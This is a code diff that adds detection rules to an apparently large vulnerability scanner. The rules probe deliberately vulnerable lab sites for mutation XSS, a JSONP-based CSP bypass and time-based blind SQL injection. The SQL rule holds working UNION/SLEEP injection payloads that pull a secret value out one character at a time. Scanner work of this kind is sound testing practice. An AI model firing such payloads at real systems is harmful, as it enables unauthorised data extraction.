@@ -37484,6 +37484,89 @@ const xssVulnlabStoredRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const xssVulnlabMxssLiveOracle: Rule = async (ctx) => {
+  if (!isXssVulnlabHost(ctx)) return NEGATIVE;
+  const origin = xssVulnlabProbeOrigin(ctx);
+  const url = new URL("/mxss/", origin).toString();
+  const doc = await ctx.probe.get(url, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = doc.body;
+  const hasInnerHtmlRoundTrip =
+    /preview\.innerHTML\s*=\s*(?:tpl|template)\.innerHTML/i.test(body);
+  const hasRegexSanitizer =
+    /strips\s+<script>\s+and\s+on\*\s+attributes\s+with\s+regex/i.test(body) ||
+    (/<template[^>]+id=["']stored["']/i.test(body) && /id=["']preview["']/i.test(body));
+  if (!hasInnerHtmlRoundTrip || !hasRegexSanitizer) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url,
+      snippet:
+        body.match(/preview\.innerHTML\s*=\s*(?:tpl|template)\.innerHTML[\s\S]{0,120}/i)?.[0]?.slice(0, 160) ||
+        body.slice(0, 160),
+      note: "xss.vulnlab.dev /mxss/ regex sanitizer strips on* attrs then preview.innerHTML = template.innerHTML reparses noscript/style/svg payloads — mutation XSS oracle"
+    }
+  };
+};
+
+const xssVulnlabMxssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isXssVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/mxss\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await xssVulnlabMxssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const XSS_VULNLAB_CSP_JSONP_CALLBACK = "thugirCspJsonpProbe7";
+
+const xssVulnlabCspBypassJsonpLiveOracle: Rule = async (ctx) => {
+  if (!isXssVulnlabHost(ctx)) return NEGATIVE;
+  const origin = xssVulnlabProbeOrigin(ctx);
+  const callback = XSS_VULNLAB_CSP_JSONP_CALLBACK;
+  const jsonpUrl = new URL("/csp-bypass/jsonp", origin);
+  jsonpUrl.searchParams.set("cb", callback);
+  const jsonpDoc = await ctx.probe.get(jsonpUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
+  if (jsonpDoc.status < 200 || jsonpDoc.status >= 400) return NEGATIVE;
+  if (!new RegExp(`${callback}\\s*\\(\\{`).test(jsonpDoc.body)) return NEGATIVE;
+  const pageUrl = new URL("/csp-bypass/", origin).toString();
+  const pageDoc = await ctx.probe.get(pageUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (pageDoc.status < 200 || pageDoc.status >= 400) return NEGATIVE;
+  const body = pageDoc.body;
+  const hasRestrictiveCsp = /script-src\s*['']self['']/i.test(body);
+  const hasJsonpEndpoint = /csp-bypass\/jsonp/i.test(body);
+  if (!hasRestrictiveCsp || !hasJsonpEndpoint) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      jsonpUrl: jsonpUrl.toString(),
+      pageUrl,
+      callback,
+      jsonpSnippet: jsonpDoc.body.slice(0, 120).trim(),
+      note: "xss.vulnlab.dev CSP script-src 'self' but /csp-bypass/jsonp?cb= reflects callback into executable JS — JSONP CSP bypass oracle"
+    }
+  };
+};
+
+const xssVulnlabCspBypassJsonpRouteLiveOracle: Rule = async (ctx) => {
+  if (!isXssVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/csp-bypass(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const result = await xssVulnlabCspBypassJsonpLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
 const sstiVulnlabFilteredLiveOracle: Rule = async (ctx) => {
   if (!isSstiVulnlabHost(ctx)) return NEGATIVE;
   const origin = sstiVulnlabProbeOrigin(ctx);
@@ -37601,6 +37684,63 @@ const sqliVulnlabBlindBoolRouteLiveOracle: Rule = async (ctx) => {
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
   if (!/\/blind-bool\b/i.test(pageUrl)) return NEGATIVE;
   const result = await sqliVulnlabBlindBoolLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const SQLI_VULNLAB_BLIND_TIME_SLEEP_SEC = 3;
+const SQLI_VULNLAB_BLIND_TIME_SLEEP_MS = SQLI_VULNLAB_BLIND_TIME_SLEEP_SEC * 1000;
+const SQLI_VULNLAB_BLIND_TIME_TRUE =
+  "nonexistent' UNION SELECT IF(SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-time'),1,1)='V', SLEEP(3), 'x')-- ";
+const SQLI_VULNLAB_BLIND_TIME_FALSE =
+  "nonexistent' UNION SELECT IF(SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-time'),1,1)='Z', SLEEP(3), 'x')-- ";
+
+async function sqliVulnlabBlindTimeFetchMs(
+  ctx: RuleContext,
+  origin: string,
+  usernamePayload: string
+): Promise<number> {
+  const probeUrl = new URL("/blind-time/", origin);
+  probeUrl.searchParams.set("username", usernamePayload);
+  const start = Date.now();
+  await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096, timeoutMs: 20000 });
+  return Date.now() - start;
+}
+
+const sqliVulnlabBlindTimeLiveOracle: Rule = async (ctx) => {
+  if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const origin = sqliVulnlabProbeOrigin(ctx);
+  const falseMs = await sqliVulnlabBlindTimeFetchMs(ctx, origin, SQLI_VULNLAB_BLIND_TIME_FALSE);
+  if (falseMs >= SQLI_VULNLAB_BLIND_TIME_SLEEP_MS) return NEGATIVE;
+  const trueMs = await sqliVulnlabBlindTimeFetchMs(ctx, origin, SQLI_VULNLAB_BLIND_TIME_TRUE);
+  const deltaMs = trueMs - falseMs;
+  if (trueMs < SQLI_VULNLAB_BLIND_TIME_SLEEP_MS - 500 || deltaMs < SQLI_VULNLAB_BLIND_TIME_SLEEP_MS - 500) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: new URL("/blind-time/", origin).toString(),
+      truePayload: SQLI_VULNLAB_BLIND_TIME_TRUE,
+      falsePayload: SQLI_VULNLAB_BLIND_TIME_FALSE,
+      trueMs,
+      falseMs,
+      deltaMs,
+      note: "sqli.vulnlab.dev GET /blind-time/?username= with SLEEP(3) inside IF(SUBSTRING(secret...)='V') delays ~3s for true predicate but stays fast for 'Z' — time-based blind SQLi oracle"
+    }
+  };
+};
+
+const sqliVulnlabBlindTimeRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSqliVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/blind-time\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await sqliVulnlabBlindTimeLiveOracle(ctx);
   if (!result.fired) return NEGATIVE;
   return {
     fired: true,
@@ -47418,6 +47558,12 @@ export const RULES: Record<string, Rule> = {
   sqliVulnlabUnionRouteLiveOracle,
   sqliVulnlabBlindBoolLiveOracle,
   sqliVulnlabBlindBoolRouteLiveOracle,
+  sqliVulnlabBlindTimeLiveOracle,
+  sqliVulnlabBlindTimeRouteLiveOracle,
+  xssVulnlabMxssLiveOracle,
+  xssVulnlabMxssRouteLiveOracle,
+  xssVulnlabCspBypassJsonpLiveOracle,
+  xssVulnlabCspBypassJsonpRouteLiveOracle,
   sstiVulnlabSandboxedLiveOracle,
   sstiVulnlabSandboxedRouteLiveOracle,
   juiceShopJwtAlgNoneLiveOracle,
